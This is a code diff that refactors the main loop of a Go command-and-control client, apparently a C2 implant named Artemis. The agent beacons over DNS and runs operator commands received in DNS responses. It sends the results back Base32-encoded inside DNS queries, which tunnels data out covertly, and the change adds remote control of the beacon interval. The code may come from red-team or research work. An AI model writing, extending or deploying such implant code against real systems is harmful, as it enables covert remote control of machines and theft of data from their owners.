@@ -2,21 +2,22 @@ package main
 
 import (
 	"fmt"
+	"strconv"
 	"strings"
 	"time"
 
 	"github.com/desertcod98/ArtemisC2Client/commands"
+	"github.com/desertcod98/ArtemisC2Client/config"
 	"github.com/desertcod98/ArtemisC2Client/dns"
 	"github.com/desertcod98/ArtemisC2Client/encoding"
-	"github.com/desertcod98/ArtemisC2Client/config"
 )
 
 func main() {
 	cfg, configErr := config.LoadConfig()
 
-	if(configErr != nil){
+	if configErr != nil {
 		agentId, handshakeErr := doHandshake()
-		if(handshakeErr != nil){
+		if handshakeErr != nil {
 			fmt.Println("Handshake error:", handshakeErr)
 			return
 		}
@@ -24,37 +25,25 @@ func main() {
 		cfg.BeaconInterval = 10 // seconds
 		config.SaveConfig(cfg)
 	}
-	
-	agentId := cfg.AgentId
-	beaconInterval := cfg.BeaconInterval
 
-	fmt.Println("Agent id:", agentId)
+	ctx := initContext(cfg)
+	cmdDispatcher := commands.NewDispatcher(ctx)
 
-	ticker := time.NewTicker(time.Duration(beaconInterval) * time.Second)
+	fmt.Println("Agent id:", cfg.AgentId)
+
+	ticker := time.NewTicker(time.Duration(cfg.BeaconInterval) * time.Second)
 	defer ticker.Stop()
 
-	for range ticker.C {
-		beaconRes, beaconErr := dns.DnsQuery(agentId + ".Beacon")
-		if beaconErr != nil {
-			fmt.Println("Error:", beaconErr)
-			return
-		}
-		fmt.Println("Beacon response:", beaconRes)
-
-		commandSplit := strings.Split(beaconRes, ".")
-		if len(commandSplit) < 2 {
-			continue
-		}
-
-		reverseStringArr(commandSplit)
-		job := commandSplit[0]
-		commandType := commandSplit[1]
-		commandArgs := commandSplit[2:]
-
-		if cmd, ok := commands.Dispatcher[strings.ToLower(commandType)]; ok {
-			resultChan := cmd.Execute(commandArgs)
-			result := <-resultChan
-			dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+	for {
+		select {
+		case <-ticker.C:
+			doBeacon(cfg, cmdDispatcher)
+		case newBeaconInterval := <-ctx.SetBeaconIntervalCh:
+			ticker.Stop()
+			cfg.BeaconInterval = newBeaconInterval
+			config.SaveConfig(cfg)
+			fmt.Println("[INFO] Changed beacon interval to " + strconv.Itoa(newBeaconInterval))
+			ticker = time.NewTicker(time.Duration(newBeaconInterval) * time.Second)
 		}
 	}
 }
@@ -68,6 +57,38 @@ func doHandshake() (string, error) {
 	fmt.Println("Handhsake job id:", handshakeRes)
 
 	return dns.DnsQuery(handshakeRes)
+}
+
+func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command) {
+	beaconRes, beaconErr := dns.DnsQuery(cfg.AgentId + ".Beacon")
+	if beaconErr != nil {
+		fmt.Println("Error:", beaconErr)
+		return
+	}
+	fmt.Println("Beacon response:", beaconRes)
+
+	commandSplit := strings.Split(beaconRes, ".")
+	if len(commandSplit) < 2 {
+		return
+	}
+
+	reverseStringArr(commandSplit)
+	job := commandSplit[0]
+	commandType := commandSplit[1]
+	commandArgs := commandSplit[2:]
+
+	if cmd, ok := cmdDispatcher[strings.ToLower(commandType)]; ok {
+		resultChan := cmd.Execute(commandArgs)
+		result := <-resultChan
+		dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
+	}
+}
+
+func initContext(cfg *config.Config) *config.Context {
+	return &config.Context{
+		Config:              cfg,
+		SetBeaconIntervalCh: make(chan int, 1),
+	}
 }
 
 func reverseStringArr(input []string) {
